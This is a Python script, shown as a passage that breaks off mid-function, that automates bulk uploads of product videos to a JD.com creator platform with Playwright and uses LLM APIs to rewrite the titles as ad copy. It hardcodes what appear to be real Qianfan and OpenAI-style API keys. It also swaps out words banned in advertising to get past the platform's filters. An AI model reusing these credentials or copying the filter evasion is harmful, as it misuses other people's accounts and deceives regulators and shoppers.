import requests
import os
import shutil
 
import time
from datetime import datetime, timedelta
 
import random
import json
import re 
from sys import exit
import webbrowser
import threading
import pyperclip
import subprocess

# smtplib 用于邮件的发信动作
import smtplib
# email 用于构建邮件内容
from email.mime.text import MIMEText
#构建邮件头
from email.header import Header

#同步 sync
from playwright.sync_api import sync_playwright
#异步 API
import asyncio
from playwright.async_api import async_playwright


from openai import OpenAI
import qianfan
os.environ["QIANFAN_AK"] = "rbjSEBvsnwzuqnh3Fiy2D3Lk"
os.environ["QIANFAN_SK"] = "b8fGyHGBxstzSkACwEjZx9BrdvGt9pC4"


# https://www.cnblogs.com/yoyoketang/p/17260263.html
# chrome.exe --remote-debugging-port=12345 --user-data-dir="D:\playwright_chrome"
# 需要设置环境变量， 需要编辑v5.bat；对已打开的浏览器 接管操作

#======
#数据准备　，　用户密码　,　视频文件夹目录路径-取得视频文件名列表videoFileList，　JSON数据 LIST表-提取几个数据项　索引　oid 视频 视频标题　映射关系, 

vwdPath="C:/抖音VIP带货视频/2023-01-08/其他-1"+"/" #1. Video Work Dir, 进一步取得视频文件列表　，　以视频文件为主　，再反向查json数据中需要的项　内容
 
 
# ***??? /\ 把输出导出文档　备份　与　apList 存入时的文件名　小于10的j 处理一下，　1-7- 改为 1-07- 两位，　加一个0
vfBegin="0" #3. 'oid': '1-3'　唯一 , "1-3-.mp4" 起点文件("-.mp4"去掉即是数据中的oid)，开始上传的文件　，　 , 然后取得索引　切片视频文件名列表　，再去循环上传
openPages=20 #4. <int> 20 30 40 50

chooseCKImg=False #对比ChecK 图片 , 在关键词搜索后 再加图片比对 相信度高于起始值的 再加入 结果精准
chooseSSImg=False #Search Sousuo搜索图片 直接带卡图功能 ， 在关键词搜索结果中 无结果 或 第一项 佣金低于5% 3%时 ，补加图片搜索 ，再取佣金高者加入LIST列表
SVBegin=7 #小数 +++ 比图字图 仅搜图 
brsType="chromium" # 5. 浏览器 'chromium','firefox','webkit'), default_value='chromium', key='brsType
br_PORT="12345" #浏览器端口
br_Port_File="browser_port.ini" #固定的

chooseSaveTemp= False
choosePost=False
splitFlagGGGG=False

# openAI_KEY="sk-zeKprmpFXlIKTDKq787cCb486dB14e50B1FfAe36A666Ea36" # 原
openAI_KEY="sb-4b607528a00d6d2e89ea361b92940c020eb842eb3de20b8f" # -sb
# openAI_KEY="sk-DqgxuxWV0v5zXBXnS6jcM31qAe99PI1HFskuWZ2i3j9yLk4D" #max
chooseAITitle=False

chooseCustomTag=False
TagCNameL1="其他"
TagCNameL2="其他"
 
chooseAddPro=True
chooseSPU=True #spuid列表 也加到商品中

plusTitle="" #爆品 专题 单品批量发布时， 文件名自带标题可能不足， 需要补充 扩展标题 产品名 卖点 产品优势， 功能介绍等


folder_path_cwd = os.getcwd()
# batchOpenTMP.json
config_TMP = 'batchOpenConfV6.json'

def saveConf(vwdPath,vfBegin,openPages,brsType,openAI_KEY):
    dataConfig = { 'vwdPath': vwdPath, 'vfBegin': vfBegin, 'openPages': openPages, 'brsType': brsType,'br_PORT': br_PORT, 'TagCNameL1': TagCNameL1,'TagCNameL2': TagCNameL2,'openAI_KEY':openAI_KEY }
    with open(f'{folder_path_cwd}/{config_TMP}', 'w') as file_object:json.dump(dataConfig, file_object)   

if not os.path.exists(f'{folder_path_cwd}/{config_TMP}'):
    saveConf(vwdPath,vfBegin,openPages,brsType,br_PORT,TagCNameL1,TagCNameL2,openAI_KEY) # TagCNameL1 TagCNameL2  
else:    
    # loadConf() #print("yes have TMP config file")   
    with open(f'{folder_path_cwd}/{config_TMP}', 'r') as f: 
        data = json.load(f) 
        vwdPath = data['vwdPath']         
        vfBegin = data['vfBegin'] 
        openPages = data['openPages'] 
        brsType = data['brsType']
        br_PORT=data['br_PORT']
        TagCNameL1=data['TagCNameL1']
        TagCNameL2=data['TagCNameL2']
        openAI_KEY=data['openAI_KEY']
        # TagCNameL1 TagCNameL2

# batchOpenJD.ini
config_JDDR = 'batchOpenJD.ini'
if not os.path.exists(f'{folder_path_cwd}/{config_JDDR}'):
    file = open( f'{folder_path_cwd}/{config_JDDR}', 'w', encoding = "utf-8" )
    file.write( "京东达人帐号密码 一行一个 模板: 帐号----密码" ) 
    file.close()

JDDR_List =[] #达人帐号 列表
def getJDDRList():
    L=[]    
    with open(f'{folder_path_cwd}/{config_JDDR}', 'r', encoding='utf-8') as f:  # 打开文件
        lines = f.readlines()  # 读取所有行
        for line in lines:
            L.append(line.replace("\n",""))
            #urlList.append(itemURL)
    return L   

JDDR_List =getJDDRList()

# print(JDDR_List)
# exit()

userJD="请配置帐号"
passJD="请配置密码"

vFile=f"C:/抖音VIP带货视频/2023-01-08/其他-1/1-3-.mp4" #current file: dir+file: vwd+"/"+vfile
vTitle="这是视频标题003-字串"


#取txt行，返回行列表 广告语句，从广告配置文件 中， 一行一个， 随机一个
def read_txt_file(txt_file):
    lines = []
    try:
        with open(txt_file, 'r', encoding='utf-8') as file:
            lines = [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print(f"File '{txt_file}' not found.")
    except Exception as e:
        print(f"An error occurred: {e}")    
    return lines

#******************* 临时 验证 ****************************************** 临时 验证 ****************************************** 临时 验证 *****************************************
def checkYiliuV(): 
    return True

# 1.取得视频文件列表 目录下所有文件　历遍　fList=os.listdir(pathDir) <list> ,分离后缀可能用到splitext-分离文件名与扩展名，返回一个元组;　split 方法，具体再查用法即可
# need 需要外部输入参数　os.path.join(root, file) 连接目录与文件　组成　完整的绝对文件路径　 
def getVFileNameList(file_dir,vfBegin,openPages):
    L=[]
    beginIndex=0
    allSubL=os.listdir(file_dir)
    for sub in allSubL:
        if os.path.splitext(sub)[1] == '.mp4': #splitext-分离文件名与扩展名, [0]是前缀文件名"1-2-"" , [1]是后缀　".mp4"
            L.append(sub)   

    random.shuffle(L) #原地随机打乱列表中的元素顺序

    if len(vfBegin)<8:
        beginIndex=0
    else:    
        try:   
            beginIndex=L.index(vfBegin) #根据　值　取得索引　: beginIndex=myList.index(2) ,
        except:
            beginIndex=0
        
    L=L[beginIndex:int(beginIndex+openPages)] # print(alist[10:]) # []  . 表示从列表的第10位开始取,一直取到列表结果,步长是1.
    # L.reverse()
    # ### ***循环还有一个　循环次数 openPages 控制　10页20页30页 openPages=10 ### 1-2-.mp4                     
    return L



#openAI 智能接口 chatGPT　对话gpt-3.5-turbo
def generate_AI_title(prompt_title,api_key):
    prompt = f"{prompt_title}, \n 对以上句子改写为营销广告形式的标题句子,返回中文,长度不超过54个字符"  
    # api_base = "https://one.aiskt.com/v1" # 服务器忙 暂停 用下面的openaimax,  类似平台还有:
    # api_base = "https://api.openaimax.com/v1"
    api_base = "https://api.openai-sb.com/v1"

    client = OpenAI(api_key=api_key, base_url=api_base)
    completion = client.chat.completions.create(
        model="gpt-3.5-turbo",
        messages=[
            {"role": "system", "content": "你是一个专业的自媒体产品营销编辑."},
            {"role": "user", "content": prompt}
        ]
    )
    newTitle=completion.choices[0].message.content
    newTitle=newTitle.replace('"','')
    return newTitle

#阿里-千问， 通义 千问;  支持OpenAI兼容模式
def generate_AI_title_aliQWEN(prompt_title):   
    # myRule="以营销广告为目的， 用于带货短视频的标题，对以下标题进行爆改重写，大胆创新，有吸引力但不能过份夸张，必须有一半原创，忽略原标题中的价格与促销信息，要求改写后标题长度字数在10-27个汉字内 ,返回新标题本身本身即可，不要返回多余的提示 分析序号等，只返回标题自身内容即可。原标题如下:\n\n"
    myRule="以营销点击率为目的用于带货短视频的标题创作，对以下标题进行改写，要有吸引力有创意有感情，忽略原标题中的价格及促销信息，要与原标题有60%以上的区别度，要求改写后标题长度字数在10-27个汉字内, 返回新标题本身本身即可，不要返回多余的提示 分析序号等，只返回标题自身内容即可。原标题如下:\n\n"

    api_base = "https://dashscope.aliyuncs.com/compatible-mode/v1"
    api_key=openAI_KEY
    client = OpenAI(api_key=api_key, base_url=api_base)  # api_key="sk-8b05a833b5d44c6883a8d09b417d0e12" 
    completion = client.chat.completions.create(
        model="qwen-plus-latest", # 此处以qwen-plus为例，可按需更换模型名称。模型列表：https://help.aliyun.com/zh/model-studio/getting-started/models
        messages=[
            {'role': 'system', 'content': 'You are a helpful assistant.'},
            {'role': 'user', 'content': myRule+prompt_title}],
        )        
    newTitle=completion.choices[0].message.content
    newTitle=newTitle.replace('"','')
    return newTitle

def generate_AI_title_baiduQianfan_size27(prompt_title):
    myRule="对以下标题进行字数缩减改写，要求改写后标题字数小于27个字符。原标题如下:\n\n"
    resp = qianfan.ChatCompletion().do(model="ERNIE-Speed-8K", messages=[{"role":"user","content":myRule+prompt_title}])
    # print(resp.body)
    result_Title = resp.body.get('result')
    if "\n\n" in result_Title:
        result_Title=result_Title.split("\n\n")[0]
    result_Title=result_Title.replace("标题改写：","").replace("新标题：","").replace("改写后标题：","").replace("改写后的标题为：","")
    result_Title=result_Title.replace("改写后的标题：","").replace("改后标题：","").replace("改写标题：","").replace("改写的新标题为：","") #改写的新标题为： 改后标题： 改写后的标题：
    result_Title=result_Title.replace("简化版标题：","") #
    # 分割字符串，以":("为分隔符，这将移除":("及其后的所有内容
    parts = result_Title.split(":(", 1)
    # 返回分割后的第一个部分，即冒号左侧的内容
    result_Title= parts[0]   
    parts = result_Title.split("(", 1)
    result_Title= parts[0]
    parts = result_Title.split("（", 1)
    result_Title= parts[0]
    
    return result_Title

def generate_AI_title_baiduQianfan(prompt_title):
    myRule="以为营销广告为目的对以下标题进行改写，原意相近，大胆创新，要求改写后标题长度字数小于27字符,返回新标题本身，。原标题如下:\n\n"
    resp = qianfan.ChatCompletion().do(model="ERNIE-Speed-8K", messages=[{"role":"user","content":myRule+prompt_title}])
    # print(resp.body)
    result_Title = resp.body.get('result')
    if "\n\n" in result_Title:
        part1=result_Title.split("\n\n")[0]
        if "以下是" in part1:
            result_Title=result_Title.split("\n\n")[1]
        else:    
            result_Title=part1

    result_Title=result_Title.replace("标题改写：","").replace("新标题：","")

    if len(result_Title)>27:
        result_Title=generate_AI_title_baiduQianfan_size27(result_Title)        
    return result_Title

#============选择器=======================# 选择器=====================================# 选择器================================# 选择器============

# 选择器　：# 1.视频标题:<input placeholder="请输入视频标题，字数限制5-27字" value=""> ; #app > div > div > div.content > div:nth-child(2) > div.videotitle-container > div.input-wrapper > div > span > span > input
def setVideoTitle(page,vTitle):
    
    if chooseAITitle:
        print(f"准备AI标题处理：{vTitle}")
        try:
            fullPromptTitle= plusTitle +" "+ vTitle
            rTitle= generate_AI_title_aliQWEN(fullPromptTitle)
            print(f"AI生成标题:{rTitle}")
            if "标题" in rTitle or "改写" in rTitle or  "以下是" in rTitle :
                print("AI生成标题质量差，仍使用原标题 ")
            else:
                vTitle= rTitle
        except:
            print("生成智能标题异常generate_AI_title(),可能是openAI key过期,检查替换或充值")

    vTitle =vTitle.replace('必备','多备').replace('第一','占一').replace('万能','万用').replace('首选','可选').replace('最好','很好').replace('神器','利器')
    vTitle =vTitle.replace('极致','细致').replace('完美','很好').replace('"','').replace('清仓','出清').replace('特价','特让').replace('顶级','高级') 
    vTitle =vTitle.replace(" ", "")     

    try:
        page.fill('input[placeholder="请输入视频标题，字数限制5-27字"]', vTitle) #<input maxlength="27" class="arco-input arco-input-size-default" value="" placeholder="请输入视频标题，字数限制5-27字">
        rs=random.randint(0,3)
        page.wait_for_timeout(rs*1000)
    except:
        page.wait_for_timeout(500)    
    # print("setVideoTitle OK...")

# 选择器　：# 2.上传视频　按钮　<input class="ui-btn-prev" type="button" value="上传视频"> ,'input[id="loginname"]' ,.locator('//*[@id="loginname"]')# pageLogin.click('input[id="paipaiLoginSubmit"]')
def setUploadFile(page,vf):
    setOK=False
    # print("上传前 等待2秒 ，防上传操作过快...")
    # time.sleep(2)

    with page.expect_file_chooser() as fc_info:
        page.click('div[class="trigger"]') # <div class="trigger"> <span class="upload-text">点击上传或直接将视频文件拖入此区域</span> 
    # time.sleep(2)    
    # print("上传点开弹窗后 等待2秒 ，防上传操作过快...")
    file_chooser = fc_info.value
    # time.sleep(2)
    # print("上传选择目标文件前 等待2秒 ，防上传操作过快...")
    vfPath=os.path.join(vwdPath, vf) #vwdPath+vf
    file_chooser.set_files(vfPath)
    # time.sleep(2)  # page.wait_for_timeout(4000)
    # 等待页面中特定元素的出现 <span class="video-ff-ffmpeg-text">本地预处理完成</span>

    counter = 0
    while counter < 9:
        element = page.query_selector("span.video-ff-ffmpeg-text")
        if element and element.text_content() == "本地预处理完成":
            print("本地预处理完成 元素出现并且状态符合要求，跳出循环")
            setOK=True
            break
        else:
            # "本地预处理完成"元素未出现或状态不符合要求，等待1秒
            page.wait_for_timeout(1000) #time.sleep(1)
            counter += 1
    return setOK
    # page.wait_for_function(f"""(text) => {{
    #         const elements = Array.from(document.querySelectorAll('span'));
    #         return elements.find(element => element.innerText === "本地预处理完成");
    #     }}""", "本地预处理完成")

# 3.封面图
def setVideoThumb(page,coverFile,waitMS):
    vfPath=os.path.join(vwdPath, coverFile) #为独立上传封面图准备 暂时未用上
    print(f"视频封面设置:setVideoThumb 封面图片文件：{vfPath}")
    # https://blog.csdn.net/weixin_44043378/article/details/120049425 教程    
    # 区域显示点击设置 <div class="image-cut-uploadarea-modalcontent-upload-tip">点击设置封面</div>    image-cut-uploadarea-modalcontent-upload 
    page.wait_for_selector('div[class="image-cut-uploadarea-modalcontent-upload"]') #如果用当前元素无法定位 异常 不显示VISABLE，可向上级 用上级路径一级级向下指定 ，这个封面特殊，上级也可以点，效果相同
    page.wait_for_timeout(1000)#  time.sleep(25)
    # 处理完成 ， 等 这个显示出来，证明视频已上传完成，可以点下一步：封面设置
    # <div class="videoImgAuto-progress-ok">处理完成</div>
    # #ui-descriptionStr > div > div > div.dd.ip > div.dd.flexrow > div.videoImgAuto > div
    page.wait_for_selector('div[class="image-cut-uploadarea-modalcontent-upload-tip"]') # 
    page.wait_for_timeout(1000)
    # 点击设置 page.click("text=点击设置")
    page.click('div[class="image-cut-uploadarea-modalcontent-upload-tip"]') #成功    
    #print("OK...成功点击了:点击设置")
    page.wait_for_timeout(waitMS) # waitMS 16000 毫秒数 1000是1秒

    #确 认 (自定义选图下的 确认)
    # <span class="cropper-face cropper-move" data-cropper-action="all"></span>
    page.wait_for_selector('span[class="cropper-face cropper-move"]') # 
    page.wait_for_timeout(1000)

    # page.click('button[class="arco-btn arco-btn-primary arco-btn-size-default arco-btn-shape-round cover-image-modal-footer-confirm"]') #确定  #过时 被修改
    page.click('body > div:nth-child(17) > div.arco-modal-wrapper.arco-modal-wrapper-align-center > div > div:nth-child(2) > div.arco-modal-footer > div > button.arco-btn.arco-btn-primary.arco-btn-size-default.arco-btn-shape-round > span') #确定  
    page.wait_for_timeout(1000)

#add 加点一下 ， 我知道了， 提示
    # body > div:nth-child(16) > div > div > div:nth-child(2) > div > div > div.paragraph-salepoit-guide-btn > button > span
def clickPopButton(page):
    try:
        page.wait_for_selector('body > div:nth-child(16) > div > div > div:nth-child(2) > div > div > div.paragraph-salepoit-guide-btn > button > span') # 
        page.wait_for_timeout(500)
        page.click('body > div:nth-child(16) > div > div > div:nth-child(2) > div > div > div.paragraph-salepoit-guide-btn > button > span') #确定  
        page.wait_for_timeout(500)
    except:
        print("点 弹窗(我知道了) 异常，可能未找到")    


#取 html内容 用playwright 异步，====== ADDED 2025-03-02 ======
def getHTMLbyPlaywright(url,context):
    # try:    
    pageSPU =  context.new_page()            
    pageSPU.goto(url) 
    pageSPU.wait_for_timeout(200)        
    # pageSPU.wait_for_load_state('networkidle')       
    # await asyncio.sleep(1)    
    html_content =  pageSPU.content()
    pageSPU.close()    
    return html_content
        
async def getHTMLbyPlaywright_OLD(url):
    try:
        async with async_playwright() as playwright:            
            browser = await playwright.chromium.connect_over_cdp("http://localhost:12369/")
            context = browser.contexts[0]
            page = await context.new_page()            
            await page.goto(url)         
            await page.wait_for_load_state('networkidle')           
            html_content = await page.content()
            await page.close()
            await asyncio.sleep(1)
            return html_content
    except Exception as e:
        print(f"请求失败: {e}")
        return "*** 异常 ***异步:12369.getHTMLbyPlaywright未取得html内容*** 异常"
    
#取SPU列表 ， 通过网址取网页源码，源码中取SPU列表 全部，包括当前的主SKU
def getSPU_list(url,context):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
    }
    try:        
        response = requests.get(url, headers=headers)# 发送 HTTP GET 请求以获取网页内容
        response.raise_for_status()  # 检查请求是否成功        
        html_content = response.text# 获取网页的 HTML 源码  
        if len(html_content)<5000:
            html_content = getHTMLbyPlaywright(url,context)             
            print("Playwright 获取的 HTML 内容长度:", len(html_content))   
            # html_content=getHTMLbyPlaywright(url) 
            # 在同步函数中运行异步函数
            # html_content = asyncio.run(getHTMLbyPlaywright(url))  

        skus = extract_colorSize_skus(html_content)  # 提取 colorSize 的内容
        return skus
    except requests.exceptions.RequestException as e:
        print(f"获取URL内容时出错：{e}")
        return []
    
#从 colorSize 字符串中 提取全部的sku字位 组成列表 作为SPU扩展返回使用
def extract_colorSize_skus(html_content):
    """
    从HTML内容中提取colorSize部分的所有skuId值，并返回一个列表。
    
    参数:
        html_content (str): HTML源码字符串
        
    返回:
        list: 包含colorSize中所有skuId的列表
    """
    # 提取colorSize部分的内容
    color_size_pattern = r'colorSize: (\[.*?\])'
    color_size_match = re.search(color_size_pattern, html_content, re.DOTALL)
    
    skus = []  # 用于存储skuId的列表
    
    if color_size_match:
        color_size_content = color_size_match.group(1)
        
        # 从colorSize内容中提取skuId
        sku_pattern = r'"skuId":(\d+)'
        sku_matches = re.findall(sku_pattern, color_size_content)
        
        # 将提取的skuId转换为整数并保存在列表中
        skus = [int(sku) for sku in sku_matches]
    
    return skus

    
def OLD_extract_colorSize_skus_OLD(html_content):
    try:        
        
        tmpHTML=html_content.split(' colorSize: ')[1]
        tmpHTML=tmpHTML.split(',        warestatus:')[0]
        # print(f"取得数据字符串:{tmpHTML}")

        # tmpList=tmpHTML.split('{"skuId":')[1:] 
        # SKUList = []
        # for item in tmpList:               
        #     SKU = item.split(',')[0]          
        #     SKUList.append(SKU)
       
        json_array = tmpHTML.strip().rstrip(',') # 提取 JSON 数组       
        color_size_data = json.loads(json_array) # 解析 JSON       
        skus = [item.get('skuId') for item in color_size_data if isinstance(item, dict) and 'skuId' in item] # 提取所有 skuId
        return skus
    except Exception as e:
        print(f"提取 SPU列表 extract_color_size_skus 时发生错误，有可能是 未找到 头尾标识：{e}")
        return []  
#提取SKUID从网址URL中    
def extract_sku_from_url(url):
    try:
        # 使用正则表达式提取 URL 中的数字部分
        pattern = r'https://item\.jd\.com/(\d+)\.html'
        match = re.search(pattern, url)
        if match:
            return match.group(1)
        else:
            print("未找到匹配的 SKU ID")
            return 0
    except Exception as e:
        print(f"提取 SKU ID 时发生错误：{e}")
        return 0
   

# 添加商品
def setAddProURLs(context,page,skuid):
    #直给的 商品ID号 可直接用于网址了
            
    addUrlOK=False # 加商址动作是否成功的标识，方便最后发布时判断，是否点发布按钮动作
    if len(skuid)>1:         
        #<div class="addgoods-upload"> #成功 #app > div > div > div.content > div:nth-child(2) > div.goods-advertise > div > ul > li > div
        #2024                               #app > div > div > div.content > div:nth-child(2) > div.goods-advertise > div > ul > li > div
        page.click('div[class="addgoods-upload"]')
        page.wait_for_timeout(1000)
        print(f"成功点开 添加商品 弹层界面: setAddProURLs ")

        #新修改， 2024-08-02 添加商品弹层页面新版本======, 1.点， #搜索添加 按钮；2.点 输入框，输入产品网址；3.点查询， 检测查询结果是否正常有， 如无，循环， 如有，点复选框；4，点 添加按钮
        #1.搜索添加 按钮
        locator = page.locator("text=搜索添加")
        if locator.is_visible():
            locator.click()
            print("点击成功 搜索添加")
        else:
            print("未找到包含 搜索添加 的元素")

        # page.click('#arco-tabs-0-tab-1 > span') # 0是第一次， 正常情况 也是第一次， 但它是可变化的， 第一次打开弹出层时，就是0; *vvv  
        # print("已点 搜索添加， 已切换到对应tab界面")
        page.wait_for_timeout(200)
        #2.点 输入框，输入产品网址
        # page.click('#arco-tabs-0-panel-1 > div > div > div.search-input > div > input') # 0是第一次， 正常情况 也是第一次， 但它是可变化的， 第一次打开弹出层时，就是0; *vvv 
        input_locator = page.get_by_placeholder("请输入商品关键词或商品ID进行搜索，若有多个，请用英文逗号隔开，每次最多10个。")
        input_locator.click() 
        print("已点 输入框， 准备粘贴网址")
        page.wait_for_timeout(200)

        #循环输入商品网址　proURL, 并测试是否有效，　如果有效，点确定，如果无效，下一条
        
        # proURL=item["materialUrl"] #proURL="https://item.jd.com/10034806205325.html"
        # #ui-input > input ;  <div id="ui-input" class="ipt-div"><input placeholder="输入商品链接或商品ID" value="" style="width: 340px; padding-right: 10px;"></div>
        if chooseSPU:  
            proURL=f"https://item.jd.com/{skuid}.html"
            try:          
                sku_list=getSPU_list(proURL,context)
                print(f"已选SPU 取得SPU列表: {len(sku_list)}")
                if len(sku_list)>0:

                    if len(sku_list)>10:
                        # skuID=extract_sku_from_url(proURL)                    
                        random_skus = random.sample(sku_list, 9)# 随机选择9个元素                    
                        random_skus.append(skuid)# 新增 SKUID 到随机列表中，共10条
                        inputStr = ",".join(map(str, random_skus))# 将列表转换为英文逗号分隔的字符串
                    else:  
                        inputStr = ",".join(map(str, sku_list)) 
                else:
                    inputStr=skuid   
            except:
                inputStr=skuid
                print(f" 取得SPU列表出错异常: 仍用原始URL")
                    

        else:   
            inputStr=skuid       

        input_locator.fill(inputStr) # 输入内容        
        # page.fill('#arco-tabs-0-panel-1 > div > div > div.search-input > div > input', skuid)
        page.wait_for_timeout(200)
        # #<input class="ui-btn-search" type="button" value="查询" style="margin-left: 9px; width: 90px; vertical-align: bottom; padding: 0px;">
        # page.click('#arco-tabs-0-panel-1 > div > div > div.search-input > button > span')
        chaxun_button_locator = page.query_selector('button:has-text("查询")')        
        if chaxun_button_locator and chaxun_button_locator.is_enabled():   # 检查 查询按钮是否可用
            # 点击 查询按钮
            chaxun_button_locator.click()
            print("查询 按钮已点击")
        else:
            print("查询 按钮不可用或未找到")            
    
        page.wait_for_timeout(3000)  

        # +++ 判断是否成功 有效URL ，如果有效 则会显示出现 ：<img class="choose-item-pic"     
        # 如果有效果URL，  则点右侧 确定， 如果无效URL更换下一个 循环， 如果都无效 ， 没有出现 上面的IMG显示，则点 右侧 取消：            
        try:
            # buttonCheckbox 商品列表左侧 复选框 buttonCheckbox
            buttonCheckbox = page.query_selector('div.sku-list-container > div.arco-spin.sku-list-container-loading > div > div:nth-child(1) > div > label > span > div')
            bt_enabled = buttonCheckbox.is_enabled()
            if bt_enabled:
                print("查询结果的商品网址可用,至少有一个可用 ，将写入参考文档，下一步要点选复选框/ 当前全选 ; ")                   
                # buttonCheckbox.click() # 商品列表左侧 复选框
                # 当前全选
                page.click('body > div.arco-drawer-wrapper > div.arco-drawer.add-goods-drawer-container.slideRight-appear-done.slideRight-enter-done > div > span > div > div.arco-drawer-footer > div > div > div.custom-footer-extend > div > div:nth-child(1) > label')
                page.wait_for_timeout(500)
                addUrlOK=True #只有确定按钮可用，才可被点，才能说明　加商址行为　已成功  
            else:
                # +++ 换下一个proURL　循环执行
                # print(f"确定按钮处于禁用状态,将循环下一条，当前:{proURL}")  
                print(f"确定按钮处于禁用状态,将循环下一条，当前:{skuid}")                       
        except: 
            print("添加端口 过程中， 查找商品复选框元素 出错 未找到...")  
        
        #     buttonYES = page.query_selector('#arco-tabs-0-panel-1 > div > div > div.sku-list-container > div.arco-spin.sku-list-container-loading > div > div:nth-child(1) > div > label > span > div')
        #     bt_enabled = buttonYES.is_enabled()
        #     if bt_enabled:
        #         print("查询结果可用，商品网址可用,将写入参考文档，下一步要点选复选框 ; ")   
        #         page.click('#arco-tabs-0-panel-1 > div > div > div.sku-list-container > div.arco-spin.sku-list-container-loading > div > div:nth-child(1) > div > label > span > div')
        #         page.wait_for_timeout(300)
        #         #添加 按钮
        #         print("已点选复选框 ; 下面将 点 添加 按钮")  
        #         page.click('body > div.arco-drawer-wrapper > div.arco-drawer.add-goods-drawer-container.slideRight-appear-done.slideRight-enter-done > div > span > div > div.arco-drawer-footer > div > div > div.custom-footer-btns > div > div:nth-child(3) > button')
        #         # buttonYES.click()
        #         page.wait_for_timeout(200)

        #         addUrlOK=True #只有确定按钮可用，才可被点，才能说明　加商址行为　已成功

        #     else:
        #         # +++ 换下一个proURL　循环执行
        #         print(f"确定按钮处于禁用状态,将循环下一条，当前:{skuid}")  
        #         # page.click(' div.jd-modal-footer.goods-footer > div > input.ui-btn-save[value="取消"]')                 
        # except: 
        #     print("添加端口 过程中， 查找商品复选框元素 出错 未找到...") 

        # addUrlOK还是false状态，即没有正常可用网址，则点 取消　关闭　增加商品　弹层小窗口：<input class="ui-btn-save" type="button" value="取消" style="margin-right: 10px;">  
            
        #添加 按钮; for循环所有url输入 且点选后， 最后一起添加
        print("已点选复选框 ; 下面将 点 添加 按钮")  
        page.click('body > div.arco-drawer-wrapper > div.arco-drawer.add-goods-drawer-container.slideRight-appear-done.slideRight-enter-done > div > span > div > div.arco-drawer-footer > div > div > div.custom-footer-btns > div > div:nth-child(3) > button')
        # buttonYES.click()
        page.wait_for_timeout(500)

        if not addUrlOK:              
            page.click('body > div.arco-drawer-wrapper > div.arco-drawer.add-goods-drawer-container.slideRight-appear-done.slideRight-enter-done > div > span > div > div.arco-drawer-footer > div > div > div.custom-footer-btns > div > div:nth-child(2) > button > span')        
            # page.click(' div.jd-modal-footer.goods-footer > div > input.ui-btn-save[value="取消"]')      
            print("---===人工检查页面 可手工关闭本页  addUrlOK否 未成功挂载商品,可手动关闭本页")     
            page.wait_for_timeout(500)
    else:
        print("没有取得有效商品 skuid =0")
        print("---===人工检查页面 手工补充或关闭本页 没有取得有效商品url网址集, ")

def setVideoTags(page,proKW,oid):
    # print("setVideoTags run")

    #1. 兴趣标签* div.hangye > div.arco-cascader.arco-cascader-multiple.arco-cascader-size-large.cascaderRenderTag > div > div.arco-input-tag.arco-input-tag-size-large.arco-input-tag-has-placeholder > div > div
    page.click('div.hangye > div.arco-cascader.arco-cascader-multiple.arco-cascader-size-large.cascaderRenderTag') # ***用开发者工具 复制selector 很有用， 如果还有重复可再增加[特性]       
    page.wait_for_timeout(200) 

    # chooseCustomTag TagCNameL1 
    if chooseCustomTag:
        print("---testing--- 执行自定义标签 ")
        #　element = page.wait_for_selector('li[title="生活随拍"].arco-cascader-list-item')
        page.click(f'li[title="{TagCNameL1}"].arco-cascader-list-item') # ***用开发者工具 复制selector 很有用， 如果还有重复可再增加[特性]       
        page.wait_for_timeout(200) 
        
        # 使用XPath定位第二级div中的title="生活随拍"元素  page.wait_for_selector('//div[@class="subjectLevel1"]//li[@title="生活随拍"]')
        # 在XPath中，双斜杠（//）表示选择当前节点下的所有后代节点，而不考虑它们的具体位置。换句话说，它会匹配当前节点下的所有子孙节点。
        page.click(f'//div[@class="subjectLevel1"]//li[@title="{TagCNameL2}"]') # ***用开发者工具 复制selector 很有用， 如果还有重复可再增加[特性]       
        page.wait_for_timeout(200) 
        # print("---testing--- 执行自定义标签- 已点选小类 二级")

    else:    
        #1.1 其他-其他 + 生活随拍-生活经验                
        #1.2　生活随拍-生活经验　#arco-cascader-popup-0 > div > div:nth-child(1) > div > div > div > ul > li:nth-child(21) > div
        page.click('#arco-cascader-popup-0 > div > div:nth-child(1) > div > div > div > ul > li:nth-child(21)') 
        page.wait_for_timeout(200)   
        #生活记录#arco-cascader-popup-0 > div > div.arco-cascader-list-column.cascaderSlide-enter-done > div > div > div > ul > li:nth-child(1)
        #arco-cascader-popup-0 > div > div.arco-cascader-list-column.cascaderSlide-enter-done > div > div > div > ul > li.arco-cascader-list-item.arco-cascader-list-item-active > div
        #生活经验#arco-cascader-popup-0 > div > div.arco-cascader-list-column.cascaderSlide-enter-done > div > div > div > ul > li:nth-child(2)
        page.click('#arco-cascader-popup-0 > div > div.arco-cascader-list-column.cascaderSlide-enter-done > div > div > div > ul > li:nth-child(1) > div') 
        page.wait_for_timeout(200)

        print("未选择标签，留空")
    
    # 增加自定义兴趣标签 ,最好可通过　文字内容　来定位元素,比如，亲子-早教启蒙,公用变量即可，不需要传参******

    #间隔操作 点一个界面 外的位置 ， 我们这里点 <div class="num">其他标签</div>    
    #app > div > div > div > div.content > div:nth-child(2) > div:nth-child(6) > div > div.other > div.num #2024-08-27    
    page.click('#app > div > div > div > div.content > div:nth-child(2) > div:nth-child(6) > div > div.other > div.num') # ***用开发者工具 复制selector 很有用， 如果还有重复可再增加[特性]       
    page.wait_for_timeout(100)
    
    #2　体裁标签*  ticai
    # 
    #2. #app > div > div > div.content > div:nth-child(2) > div.selectTags > div.ticai > div.arco-cascader.arco-cascader-multiple.arco-cascader-size-large.cascaderRenderTag
    #　#arco-cascader-popup-1 > div > div.arco-cascader-list-column.cascaderSlide-enter-done > div > div > div > ul > li.arco-cascader-list-item.arco-cascader-list-item-active > div
    #2024
    ##          div.ticai > div.arco-cascader.arco-cascader-multiple.arco-cascader-size-large.cascaderRenderTag > div > div.arco-input-tag.arco-input-tag-size-large.arco-input-tag-has-placeholder > div > div
    
    page.click('div.ticai > div.arco-cascader.arco-cascader-multiple.arco-cascader-size-large.cascaderRenderTag') # ***用开发者工具 复制selector 很有用， 如果还有重复可再增加[特性]       
    page.wait_for_timeout(200)
    #　 #arco-cascader-popup-1 > div > div:nth-child(1) > div > div > div > ul > li  
 
    #体裁标签  - 通用体裁 ； 测评体裁 - 单品测评
    #arco-cascader-popup-1 > div > div > div > div > div > ul > li:nth-child(4)
    #arco-cascader-popup-1 > div > div:nth-child(1) > div > div > div > ul > li:nth-child(1) > div 测评体裁
